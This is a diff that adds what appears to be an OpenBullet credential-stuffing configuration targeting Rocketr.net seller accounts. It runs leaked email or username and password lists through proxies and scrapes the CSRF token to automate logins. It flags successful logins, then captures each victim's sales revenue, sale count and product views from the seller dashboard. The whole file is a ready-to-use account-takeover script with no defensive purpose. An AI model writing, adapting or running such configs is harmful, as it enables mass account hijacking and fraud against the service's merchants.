@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Rocketr.net",
+  "SuggestedBots": 150,
+  "LastModified": "2018-05-11T11:28:50.0555116+00:00",
+  "AdditionalInfo": "",
+  "Author": "Chaos",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Main_Page REQUEST GET "https://rocketr.net/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Get_Token PARSE "<SOURCE>" LR "window.csrf_token = '" "';" Recursive=FALSE -> VAR "csrf_token" "" "" 
+#Post_Dat_Shit REQUEST POST "https://rocketr.net/_process.php" AutoRedirect=TRUE 
+  CONTENT "login_via_ajax=1&login=1&usernameOrEmail=<USER>&password=<PASS>&two_factor_key=&csrf_token=<csrf_token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://rocketr.net/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+#Keywords KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "logged_in\":true" 
+  KEYCHAIN Failure OR 
+    KEY "logged_in\":false" 
+#Get_Dashboard REQUEST GET "https://rocketr.net/seller/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Capture_Amount_Made PARSE "<SOURCE>" LR "<h2 class=\"text-success text-center\">" "</h2>" Recursive=FALSE -> CAP "Amount Made" "" "" 
+#Number_Sales PARSE "<SOURCE>" LR "<h2 class=\"text-primary text-center\"><i class=\"text-primary md md-add-shopping-cart\"></i> " "</h2>" Recursive=FALSE -> CAP "Number Sales" "" "" 
+#Product_Views PARSE "<SOURCE>" LR "<h2 class=\"text-purple text-center\"><i class=\"text-purple md md-visibility\"></i> " "</h2>" Recursive=FALSE -> CAP "Product Views" "" "" 
